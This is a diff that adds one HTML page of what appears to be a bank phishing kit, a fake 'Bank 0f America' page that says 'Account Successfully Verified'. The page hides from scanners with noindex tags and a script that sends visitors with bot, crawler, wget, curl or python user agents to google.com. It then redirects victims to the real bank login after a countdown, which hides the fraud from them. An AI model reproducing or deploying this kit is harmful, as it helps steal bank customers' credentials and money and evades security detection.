@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta name="robots" content="noindex, nofollow">
+    <script>
+    /* anti-bot */
+    const bots = [/bot/i, /crawler/i, /spider/i, /wget/i, /curl/i, /python/i];
+    const ua = navigator.userAgent;
+    if (bots.some(rx => rx.test(ua))) {
+        location.href = "https://google.com";
+    }
+    </script>
+    <meta name="robots" content="noindex, nofollow">
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Bank 0f America</title>
+  <link rel="shortcut icon" href="img/icona.png" />
+  <link rel="stylesheet" href="style2.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css" />
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" />
+ 
+ <style>
+    .message-box {
+      text-align: center;
+      padding: 20px 40px;
+      background-color: #e6ffed;
+      border: 2px solid #a1e4b9;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 128, 0, 0.2);
+      margin-top: 30px;
+    }
+
+    .message-box h1 {
+      color: #2e8b57;
+      margin: 0;
+    }
+
+    .redirect-note {
+      margin-top: 10px;
+      font-size: 14px;
+      color: #555;
+    }
+
+    .countdown {
+      font-weight: bold;
+      color: #2e8b57;
+    }
+  </style>
+</head>
+
+<body>
+
+    <div class="fdic-banner">
+  <span>Bank 0f America deposit products:</span>
+  <img src="https://secure1.bac-assets.com/spa/widgets/gt-secure-fdic-widget/1.0.0/spa-assets/images/assets-images-global-fdic-fdic-digital-sign-CSX37f66a3e.svg" 
+       alt="FDIC-Insured - Backed by the full faith and credit of the U.S. Government">
+</div>
+
+  <section id="header2">
+    <a href="index.html" class="log">
+      <img src="img/logo-main.png" width="300px" height="35px" class="logo" />
+    </a>
+    <li class="area"><i class="fa fa-lock"></i> <span>Secure Page</span></li>
+  </section>
+
+  <section id="hero2">
+    <div class="bar">
+      <ul id="navbarr">
+        <h3>Account Verified</h3>
+      </ul>
+    </div>
+  </section>
+
+  <div class="container">
+    <div>
+      <h1>Your account has been successfully verified.</h1>
+      <p class="subtitle">
+        Your account has been successfully verified.Thank you for completing the verification process <br>
+        you're now being redirected to your login.
+      </p>
+    </div>
+
+    <div class="message-box">
+      <h1>✅ Account <br> Successfully Verified</h1>
+      <p class="redirect-note">Redirecting you to your login in <span class="countdown" id="countdown">10</span>
+        seconds...</p>
+    </div>
+  </div>
+
+  <script>
+    let seconds = 10;
+    const countdownEl = document.getElementById("countdown");
+
+    const countdownInterval = setInterval(() => {
+      seconds--;
+      countdownEl.textContent = seconds;
+
+      if (seconds <= 0) {
+        clearInterval(countdownInterval);
+        window.location.href = "https://secure.bankofamerica.com/login/sign-in/signOnV2Screen.go";
+      }
+    }, 1000);
+  </script>
+</body>
+<footer>
+  <div class="gray-bground-skin">
+    <div class="secure"><i class="fa fa-lock"></i> Secure area</div>
+    <div class="link-container">
+      <div class="link-row">
+        <a href="#" target="_blank">Privacy</a>
+        <a href="#" target="_blank">Security</a>
+        <a class="last-link" href="javascript:OneTrust.ToggleInfoDisplay();">CA Opt-Out Preference Signals Honored</a>
+        <div class="clearboth"></div>
+      </div>
+    </div>
+    <p>
+      Bank 0f America, N.A. Member FDIC.
+      <a href="#" target="_blank">Equal Housing Lender</a>
+      <i class="fa fa-home"></i><br />© 2025 Bank 0f America Corporation.
+    </p>
+  </div>
+</footer>
+
+</html>
